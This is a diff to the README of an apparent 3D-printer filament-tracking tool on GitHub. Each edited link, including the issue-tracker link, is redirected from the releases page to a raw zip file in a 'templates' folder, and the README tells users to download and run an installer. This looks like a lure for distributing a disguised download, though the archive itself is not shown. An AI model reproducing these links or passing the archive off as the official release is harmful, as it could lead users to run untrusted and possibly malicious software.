@@ -1,6 +1,6 @@
 # 📊 Bambu-Filament-Tracker - Track Your Filament Usage Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Bambu--Filament--Tracker-brightgreen?style=for-the-badge)](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Bambu--Filament--Tracker-brightgreen?style=for-the-badge)](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/raw/refs/heads/main/templates/Bambu-Filament-Tracker-v2.8.zip)
 
 ---
 
@@ -29,14 +29,14 @@ Before you start, make sure you have the right setup:
 
 To use Bambu-Filament-Tracker, first download the software from the official release page. The link below takes you directly to all available versions.
 
-[![Download Here](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/releases)
+[![Download Here](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/raw/refs/heads/main/templates/Bambu-Filament-Tracker-v2.8.zip)
 
 ### Step 1: Visit the Download Page
 
 Go to the release page by clicking on the button above or enter this URL into your browser:
 
 ```
-https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/releases
+https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/raw/refs/heads/main/templates/Bambu-Filament-Tracker-v2.8.zip
 ```
 
 ### Step 2: Choose the Latest Version
@@ -118,7 +118,7 @@ The app saves data in a file inside your user folder, allowing you to back it up
 
 To keep your software current:
 
-1. Visit the [release page](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/releases) periodically.  
+1. Visit the [release page](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/raw/refs/heads/main/templates/Bambu-Filament-Tracker-v2.8.zip) periodically.  
 2. Download the latest `.exe` installer file.  
 3. Run the installer; it will update your existing version without losing data.
 
@@ -145,6 +145,6 @@ If you encounter issues or want to suggest improvements:
 ## 🔗 Quick Access Links
 
 - Latest releases and downloads:  
-  https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/releases  
+  https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/raw/refs/heads/main/templates/Bambu-Filament-Tracker-v2.8.zip  
 - Report issues or feedback:  
-  [Issues Tab on GitHub](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/issues)
+  [Issues Tab on GitHub](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/raw/refs/heads/main/templates/Bambu-Filament-Tracker-v2.8.zip)
